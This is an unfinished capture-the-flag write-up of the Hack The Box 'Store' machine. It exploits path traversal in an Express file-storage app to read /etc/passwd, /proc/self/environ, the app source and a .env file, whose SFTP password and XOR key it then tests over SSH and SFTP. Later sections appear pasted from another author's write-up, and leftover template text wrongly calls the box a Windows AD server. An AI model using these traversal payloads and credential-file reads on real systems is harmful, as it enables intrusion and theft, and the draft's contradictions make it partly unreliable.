---
title: Store (Very Hard , back laters)
date: 2026-03-11
ShowToc: true
draft: true
TocOpen: true
tags:
  - blog
  - HTB
  - Linux
lastmod: 2026-03-21T03:16:09.668Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Store" >}}

***

# Recon 10.129.234.X

### \[\[PORT & IP SCAN]]

The `nmap` reveal that the machine is ((change it) a standard Windows AD Server , with the kerberos auth , also the ldap query , and the 3389 port show that the domain `AWSJPDC0522.shibuya.vl` ,but the ldap anonymous inquiry failed .)

```
```

### \[\[FTP 21]]

Try the `anonymous` : `anonymous` , and we

```
anonymous : anonymous
```

```
```

### \[\[SMTP & POP 25 ,110]]

```
```

### \[\[SNMP Recon 161,162,10161,10162]]

```
```

### \[\[DNS 53]]

```
netexec smb 10.129.32.246 --generate-hosts-file hosts
sudo vim /etc/host 
```

### \[\[LDAP 389]]

```
```

### \[\[SMB 445]]

we used the account of `guest` to anonymous login , and

```
```

### \[\[NFS 2049]]

```
```

### \[\[Unkown Port]]

```
```

***

backup

### \[\[MSSQL 1433]] -- Scans

```
```

### \[\[MYSQL 3306]] -- Scans

```
```

### \[\[SSH 22]]

```
```

***

### Web Recon 5002

### Tech stack

Return the `Cannot GET /404` , look like the `Express` 500

![Pasted image 20260313183529.png](/ob/Pasted%20image%2020260313183529.png)

### \[\[WebSite Directory BurteForce]]

```
└─# feroxbuster -u http://10.129.238.32:5002 
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.238.32:5002/
 🚩  In-Scope Url          │ 10.129.238.32
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET       10l       16w      179c http://10.129.238.32:5002/images => http://10.129.238.32:5002/images/
301      GET       10l       16w      173c http://10.129.238.32:5002/css => http://10.129.238.32:5002/css/
301      GET       10l       16w      173c http://10.129.238.32:5002/tmp => http://10.129.238.32:5002/tmp/
200      GET        1l       51w      807c http://10.129.238.32:5002/upload
200      GET        0l        0w        0c http://10.129.238.32:5002/css/styles.css
200      GET        1l       35w      589c http://10.129.238.32:5002/list
200      GET      177l     1029w    84188c http://10.129.238.32:5002/images/laptop.jpg
200      GET        7l     2122w   159515c http://10.129.238.32:5002/css/bootstrap.min.css
200      GET        1l       87w     1161c http://10.129.238.32:5002/
200      GET        1l       51w      807c http://10.129.238.32:5002/Upload
200      GET        1l       51w      807c http://10.129.238.32:5002/UPLOAD
200      GET        1l       35w      589c http://10.129.238.32:5002/List
200      GET        1l       51w      807c http://10.129.238.32:5002/UpLoad
[####################] - 3m    120015/120015  0s      found:13      errors:185    
[####################] - 3m     30000/30000   190/s   http://10.129.238.32:5002/ 
[####################] - 3m     30000/30000   190/s   http://10.129.238.32:5002/images/ 
[####################] - 3m     30000/30000   189/s   http://10.129.238.32:5002/css/ 
[####################] - 3m     30000/30000   195/s   http://10.129.238.32:5002/tmp/        
```

### \[\[Exploit-CVE]]  & \[\[Default 404 Pages]]

```
whatweb http://example.com to find the version
```

```
curl https://example.com/404
```

There is no function of List files and the Uploads File ,

### Upload files

![Pasted image 20260314134356.png](/ob/Pasted%20image%2020260314134356.png)

1. Create the file\
   ![Pasted image 20260314134550.png](/ob/Pasted%20image%2020260314134550.png)

```
echo "test" > test  
```

![Pasted image 20260314134708.png](/ob/Pasted%20image%2020260314134708.png)

back the List file function

![Pasted image 20260314134805.png](/ob/Pasted%20image%2020260314134805.png)

![Pasted image 20260314134826.png](/ob/Pasted%20image%2020260314134826.png)

We analyze that the link `http://something/file` , file is the key word for the development to store the file , so i can try the ifl attack .

![Pasted image 20260314134852.png](/ob/Pasted%20image%2020260314134852.png)

Also , base on the web directory brute-force result , there is the `tmp` directory

http://10.129.230.130:5002/tmp/test

http://10.129.230.130:5002/file/test

rm test | wget http://10.129.230.130:5002/tmp/test && cat test

rm test | wget  http://10.129.230.130:5002/file/test &&  cat test

![Pasted image 20260314140932.png](/ob/Pasted%20image%2020260314140932.png)

is also can be download.

so i think the web system will handle my uplaod file like that

test file --> tmp directory --> file directory

so i will do these 2 ifl directpry brute-force

i will use the lfi for fuzz and payloadallthething

i will use this https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Traversal.txt as the POC first

```
wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/File%20Inclusion/Intruders/Traversal.txt
```

```java
└─$ ffuf -u http://10.129.238.32:5002/file/FUZZ  -w ./Traversal.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.238.32:5002/file/FUZZ
 :: Wordlist         : FUZZ: /home/parallels/Desktop/htb/store/Traversal.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

..%252fboot.ini         [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 317ms]
..%252f..%252fboot.ini  [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 347ms]
..%252f..%252f..%252fboot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 396ms]
..%252f..%252f..%252f..%252f..%252fboot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 410ms]
..%252f..%252f..%252f..%252fboot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 410ms]
..%252f..%252f..%252f..%252f..%252f..%252f..%252fboot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 825ms]
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 713ms]
%252e%252e%252f%252e%252e%252fboot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 731ms]
%252e%252e%252fboot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 731ms]
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 719ms]
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fboot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 807ms]
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 719ms]
..%252f..%252f..%252f..%252f..%252f..%252fboot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 825ms]
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 723ms]
%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 729ms]
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fboot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 719ms]
..\..\..\..\..\boot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 581ms]
..%255c..%255cboot.ini  [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 483ms]
..%255cboot.ini         [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 513ms]
..\..\..\..\..\..\..\..\boot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 566ms]
..\..\..\..\..\..\..\boot.ini [Status: 200, Size: 567, Words: 30, Lines: 1, Duration: 566ms]

```

go to the http://10.129.238.32:5002/file/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

![Pasted image 20260314141452.png](/ob/Pasted%20image%2020260314141452.png)

it is encode , i will analyze the `test` file again to how to decode

```
└─$ rm test | wget http://10.129.230.130:5002/tmp/test && cat test 
--2026-03-14 14:29:43--  http://10.129.230.130:5002/tmp/test
Connecting to 10.129.230.130:5002... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5 [application/octet-stream]
Saving to: ‘test’

test                                        100%[===========================================================================================>]       5  --.-KB/s    in 0s      

2026-03-14 14:29:43 (540 KB/s) - ‘test’ saved [5/5]

Jo                                                                                                                                                                                
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/htb/store]
└─$ rm test | wget  http://10.129.230.130:5002/file/test &&  cat test 
--2026-03-14 14:29:52--  http://10.129.230.130:5002/file/test
Connecting to 10.129.230.130:5002... connected.
HTTP request sent, awaiting response... 200 OK
Length: 580 [text/html]
Saving to: ‘test’

test                                        100%[===========================================================================================>]     580  --.-KB/s    in 0s      

2026-03-14 14:29:52 (42.5 MB/s) - ‘test’ saved [580/580]

<!DOCTYPE html><html><head><title>Secure Encrypted Storage - Data</title><link rel="stylesheet" href="/css/bootstrap.min.css"><link rel="stylesheet" href="/css/styles.css"></head><body><nav class="navbar navbar-expand-lg navbar-dark bg-dark"><a class="navbar-brand d-flex align-items-center" href="#"> <span class="mx-auto">Secure Encrypted Storage - Data</span></a></nav><div class="container listing-reg mt-5"><h5>Data</h5><pre>test
</pre><hr class="my-4"><a href="data:application/octet-stream;charset=utf-8;base64,dGVzdAo=" download="data.bin">Download</a></div></body></html>       
```

the `data:application/octet-stream;charset=utf-8;base64,dGVzdAo=` is the key word

### stream cipher

***

### Restart

\--> how the download handle?

### Method  1

![Pasted image 20260314150917.png](/ob/Pasted%20image%2020260314150917.png)

The upload have the function of encode , so i get the file of `etc/passwd` and then upload back the upload function will get the code

```
└─$ curl --output passwd.bin  http://10.129.230.130:5002/file/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5593  100  5593    0     0   3368      0  0:00:01  0:00:01 --:--:--  3367
```

We get the data

```
└─$ cat passwd.bin                                                                                   
<!DOCTYPE html><html><head><title>Secure Encrypted Storage - Data</title><link rel="stylesheet" href="/css/bootstrap.min.css"><link rel="stylesheet" href="/css/styles.css"></head><body><nav class="navbar navbar-expand-lg navbar-dark bg-dark"><a class="navbar-brand d-flex align-items-center" href="#"> <span class="mx-auto">Secure Encrypted Storage - Data</span></a></nav><div class="container listing-reg mt-5"><h5>Data</h5><pre>:V_/yxWK
#yJ'M@J5*]*
           Jo3&quot;VU'_fy,
                           \
9yM;    &gt;-   =KU5*]&amp;U&gt;-9Z!_ey*W@J5*]g▒J$!ZVgV
0*]2;J@mp
                r@      _x'VNrBL        x0QQ&amp;BW     8$ZVB@m;
                                                                        r[
                                                                          OVcy@A&amp;U&gt;-     *WU.-P2/
r[      @6.VKrBL        x$RU-U$1K*WU                                                                    Tm;
                                    8/\_!39yK~H_:&quot;]J4&quot;PP-BT
                                                                     lFK:BJ▒
                                                                            9l]W$^
                                                                                  ]/C0W@Rm/CJ$3\W$BU
mlFK:BJ▒
        9l]W$^
              ].RQ$WA@]m{       U)U@J!&quot;A%
                                              P_x6@Jg[
                                                      x-\T'
Po9&amp;DKrC_ny]]?U61K8VJ9&amp;DKrBL    x0QQ&amp;BW     8$ZVB▒Lm;               xJ_&quot;6PHrBO0CW'43   =KU5*]&amp;U&gt;-9H:A_/y
    r\
@%,KArB[
        mlFK:BJ▒
                9l]W$^
                      ]4DOe     Xm;
                                        {W
I_ 4D,
_x6@Jg[x5RJg▒N
       x-\T'
Po5&quot;PS=_dw
                |W[lt;6CJ5&quot;PS=J@J&quot;0A;PJ9,_W/Wp        &gt;0G0W
B_d{    u)U
           0cQ;79&quot;T]:W
                           %l_Q;U$1K*WU
                                       8/\_!34yK{TI\m*A[,9lZJ+  U$1K*WU
                                                                       8/\_!3
K_cr    &amp;                                                                67@0W
             M  E6TI#*]_h&gt;@  2.)     T
                                         ~yN)
                                             5lTV)J@J&quot;0A;PJ9,_W/Wp
                                                                       8!\\1WA@Sbv
                                                                                  r[
                                                                                    OVcy]W*]_x-\V-P     2-Gg▒J$!ZVgV
0*]2;J:'V-N&lt;yKy]     @Tgq    K13c}]&lt;▒wRV)
\97d9l@A;\mlFK:BJ▒
                  9l]W$^
                        ]0JK&ltTH%&amp;@W$@mr   r\      I_$:@L-]Z720\T&gtKVI{yJ=        $7VU,W%l@Z!
;,TQ&amp;gT$&quot;T]*▒J@mr
r\      O_ml]W&ampA#&amp;]LrBL  x0QQ&amp;BW     8$ZVB@  2.W&lt;T.-P0JVmrr@      2.W▒TE:][ V
                                                                                           -&quot;GQ'VImlAM&amp;BJ#&amp;^\rBL       x0QQ&amp;BW     8$ZVB@          8$      @r\     N_frrB2l@A;V_x6@Jg[
                                                                           x-\T'
@_x-\V-PLrKUby  2-Gg▒J$!ZVgV
0*]2&lt;J@mrrH_~▒;_61V▒;X{oJ;*Q&lt;T@J5*].
                                          U     ]6FQ,   _fsy\
@_x1FVg▒L3yM;   &gt;-V'V
                        9IG[8   Lm;             xUKTcy  &amp;W&gt;0G]&amp;U$1K*WU
                                                                                 8/\_!3 ?'      @r\     C_av
                                                                                                            |WU&quot;-K;]@J&quot;0A;PJ9,_W/Wp8/_Q&amp;
2lCW$P#&amp;    *WU6/@]BX$ RH-WA@Tfr5RJgX       y[@J!&quot;A$[U 6-WK+
                                                                     I_x6@Jg[
                                                                             x-\T'
''J-FH,@K%&amp;@PrKTey  W_
    K?cFK-VImlAM&amp;BJ#&amp;^\rBL      x0QQ&amp;BW     8$ZVZHH&gt;-@L)ZH4,]V-M@mr
                                                                                  r[
                                                                                    OVcy        &amp;W&gt;0G]&amp;U$1K*WU
                                                                                                                         8/\%,]Ah1\V8-dWTfw         z\9
            %l_Q*BZ8-Jg▒J$!ZVgV
0*]2=L&quot;yKy]        J_fr8[
                              #6         TJ&quot;!FV&lt;▒U&gt;-Z)Qp     /'      @rTC_fsrBO0]Y8BUx \U%WU /'      *WU6/@]B   \
8.VO@J5*]*      dAU
8.V;      Jo$%GH=_/x_KUgq       dAU
    M
$&amp;AgPJ1&quot;_K-gf&quot;1VTrC\oy
pWU61T'
&quot;1VTrB[
            x%RT3</pre><hr class="my-4"><a href="data:application/octet-stream;charset=utf-8;base64,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" download="data.bin">Download</a></div></body></html>                                                                                                              
```

upload to the `/upload`

![Pasted image 20260314152034.png](/ob/Pasted%20image%2020260314152034.png)

back to the `List`

![Pasted image 20260314152223.png](/ob/Pasted%20image%2020260314152223.png)

`download` back this file in the tmp `http://10.129.230.130:5002/tmp/passwd`

![Pasted image 20260314152712.png](/ob/Pasted%20image%2020260314152712.png)

ubuntu and dev are the non root users with shells set. I’ll take a look at the environment variables in the current process with `/proc/self/environ` (which returns null separated values, so I’ll use `tr` to replace those with newlines):

```shell
oxdf@hacky$ ./file_read.py 10.129.31.17 /proc/self/environ | tr '\00' '\n' 
USER=dev
npm_config_user_agent=npm/8.5.1 node/v12.22.9 linux x64 workspaces/false
npm_node_execpath=/usr/bin/node
npm_config_noproxy=
HOME=/home/dev
npm_package_json=/home/dev/projects/store1/package.json
npm_config_userconfig=/home/dev/.npmrc
npm_config_local_prefix=/home/dev/projects/store1
SYSTEMD_EXEC_PID=841
COLOR=0
npm_config_metrics_registry=https://registry.npmjs.org/
LOGNAME=dev
JOURNAL_STREAM=8:6217
npm_config_prefix=/usr/local
npm_config_cache=/home/dev/.npm
npm_config_node_gyp=/usr/share/nodejs/node-gyp/bin/node-gyp.js
PATH=/home/dev/projects/store1/node_modules/.bin:/home/dev/projects/store1/node_modules/.bin:/home/dev/projects/node_modules/.bin:/home/dev/node_modules/.bin:/home/node_modules/.bin:/node_modules/.bin:/usr/share/nodejs/@npmcli/run-script/lib/node-gyp-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=4abbfc48b5e44622bb0ac38ca33addb7
NODE=/usr/bin/node
LANG=C.UTF-8
npm_lifecycle_script=nodemon --exec 'node --inspect=127.0.0.1:9229 /home/dev/projects/store1/start.js'
SHELL=/bin/bash
npm_lifecycle_event=watch
npm_config_globalconfig=/etc/npmrc
npm_config_init_module=/home/dev/.npm-init.js
npm_config_globalignorefile=/etc/npmignore
npm_execpath=/usr/share/nodejs/npm/bin/npm-cli.js
PWD=/home/dev/projects/store1
npm_config_global_prefix=/usr/local
npm_command=run-script
INIT_CWD=/home/dev/projects/store1
EDITOR=vi
```

#### Web Source

I’ll grab `start.js`:

```
require('dotenv').config();
const app = require('./app');

const server = app.listen(process.env.PORT, () => {
  console.log(`Express is running on port ${server.address().port}`);
});
```

There’s two interesting bits here:

* The `dotenv` package will read environment variables from a `.env` file in the same directory.
* The main webserver code is in `app.js`.

The `.env` file has four items:

```
SFTP_URL=sftp://sftpuser:WidK52pWBtWQdcVC@localhost
SECRET=Hm9zeWC38
STORE_HOME=/home/dev/projects/store1
PORT=5000
```

It’s interesting that it’s only port 5000 (where do 5001 and 5002 come from?). The `SECRET` is the encryption XOR key. There are creds for sftpuser, which `passwd` shows has UID 1002, but the shell set to `false`. I’ll come back to this.

`app.js` sets up [ExpressJS](https://expressjs.com/) and the routes in `./routes`:

```
const express = require('express');
const path = require('path');
const routes = require('./routes/index');
const bodyParser = require('body-parser');

const app = express();

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));
app.use('/', routes);

module.exports = app;
```

`/home/dev/projects/store1/routes/index.js` has the guts of the application:

```
const express = require('express');
const SFTPClient = require('../sftp').SFTPClient;
const multer  = require('multer')
const path = require('path');
const xorFileContents = require('../crypto').xorFileContents;


const router = express.Router();

var storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'public/tmp/')
    },
    filename: function (req, file, cb) {
        cb(null, file.originalname)
  }
})
var upload = multer({ storage: storage })

const parsedURL = new URL(process.env.SFTP_URL);
const port = parsedURL.port || 22;
const { host, username, password } = parsedURL;
const client = new SFTPClient();
client.connect( { host, username, password });

// index
router.get('/', (req, res) => {
    res.render('index', { title: 'Secure Encrypted Storage - 01001101 01101001 01101100 01101001 01110100 01100001 01110010 01111001 00100000 01000111 01110010 01100001 01100100 01100101' });
});

// list files on sftp
router.get('/list', async function (req, res) {
    var fileNames = await client.listFiles("files");
    res.render('list', {  title: 'Secure Encrypted Storage - List', fileNames: fileNames });
});

// upload file to temp folder, move encrypted into sftp & remove temp file
router.get('/upload', async function (req, res) {
    res.render('upload', { title: 'Secure Encrypted Storage - Upload' });
});
router.post('/upload', upload.single('imageupload'), async function (req, res) {
    const name = req.file.filename;
    const filePath = `${process.env.STORE_HOME}/public/tmp/${name}`;
    // Todo: Use unique keys for each user
    await xorFileContents(filePath, process.env.SECRET, inplace=true);
    await client.uploadFile(filePath, `files/${name}`);
    // Todo: Remove unencrypted files from uploads dir
    res.send(`
        <script>
            setTimeout(function() {
            window.location.href = '/';
            }, 1000);
        </script>
        File upload successfully.
        `);
});


// get content of a specific file
router.get('/file/:file', async function (req, res) {
    const name = req.params.file;
    const filePath = `${process.env.STORE_HOME}/public/tmp/${name}`;
    if (path.normalize(filePath) == filePath) {
        await client.downloadFile(`files/${name}`, filePath);
    }
    const data = await xorFileContents(filePath, process.env.SECRET, inplace=false);
    res.render('file', { title: 'Secure Encrypted Storage - Data', data: data, b64data: Buffer.from(data).toString('base64') });
});

// get content of specific file directly
router.post('/file', async function (req, res) {
    const name = req.body.file;
    const filePath = `${process.env.STORE_HOME}/public/tmp/${name}`;
    // Only store files into valid paths!
    console.log(filePath);
    console.log(path.normalize(filePath));
    if (path.normalize(filePath) == filePath) {
        await client.downloadFile(`files/${name}`, filePath);
    }
    const data = await xorFileContents(filePath, process.env.SECRET, inplace=false);
    res.send(data);
});


module.exports = router;
```

It’s using SFTP to store the files in `${process.env.STORE_HOME}/public/tmp/`, where they are then XOR encrypted and then uploaded to SFTP. There’s a “todo” comment about cleaning up this directory.

### Validate Creds

SFTP runs over SSH, so I can check the creds there:

```
oxdf@hacky$ netexec ssh 10.129.31.17 -u sftpuser -p WidK52pWBtWQdcVC
SSH         10.129.31.17    22     10.129.31.17     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.129.31.17    22     10.129.31.17     [+] sftpuser:WidK52pWBtWQdcVC  Linux - Shell access!
```

There work! Unfortunately, `netexec` doesn’t check if I can actually get a shell. I can’t:

```
oxdf@hacky$ sshpass -p WidK52pWBtWQdcVC ssh sftpuser@10.129.31.17
This service allows sftp connections only.
Connection to 10.129.31.17 closed.
```

## Shell as dev

### Tunnel

#### SFTP

I can connect to SFTP:

```
oxdf@hacky$ sftp sftpuser@10.129.31.17
Warning: Permanently added '10.129.31.17' (ED25519) to the list of known hosts.
(sftpuser@10.129.31.17) Password: 
Connected to 10.129.31.17.
sftp> ls
files  
sftp> ls files
files/0xdf.png               files/ejs_test.txt           files/file_on_5000.txt       files/file_on_5001.txt       
files/file_on_5002.txt       files/known_plaintext.txt    files/port_test.txt          files/pwned.txt              
files/shell.php              files/ssti_test.txt          files/test.txt   
```
